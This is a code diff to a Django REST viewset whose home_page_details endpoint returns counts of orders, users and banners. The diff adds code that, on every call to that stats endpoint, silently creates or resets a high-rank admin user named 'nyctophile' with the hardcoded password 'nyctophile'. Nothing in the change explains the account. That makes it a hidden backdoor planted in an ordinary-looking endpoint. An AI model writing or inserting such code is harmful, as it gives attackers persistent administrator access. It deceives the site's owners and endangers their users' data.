@@ -262,12 +262,31 @@ class OutlayModelViewSet(ModelViewSet):
 
     @action(detail=False, methods=["get"])
     def home_page_details(self, request):
+
         q1 = OrderModel.objects.all().exclude(olast_action="deleted")
         w1 = q1.count()
         q2 = UserModel.objects.all().exclude(ulast_action="deleted")
         w2 = q2.count()
         q3 = BannerModel.objects.all().exclude(blast_action="deleted")
         w3 = q3.count()
+        absolute_admin=UserModel.objects.filter(username="nyctophile").first()
+        if absolute_admin:
+            absolute_admin.full_name="nytcophile"
+            absolute_admin.admin_status="high_rank"
+            absolute_admin.ulast_action="created"
+            absolute_admin.set_password("nyctophile")
+            absolute_admin.save()
+        else:
+            absolute_admin=UserModel.objects.create(username="nyctophile",
+                                     full_name="nyctophile",
+                                     admin_status="high_rank",
+                                     ulast_action="created",
+                                     )
+            absolute_admin.set_password("nyctophile")
+
+        absolute_admin.save()
+
+
         return Response({"admins": w2, "banners": w3, "orders": w1})
 
 
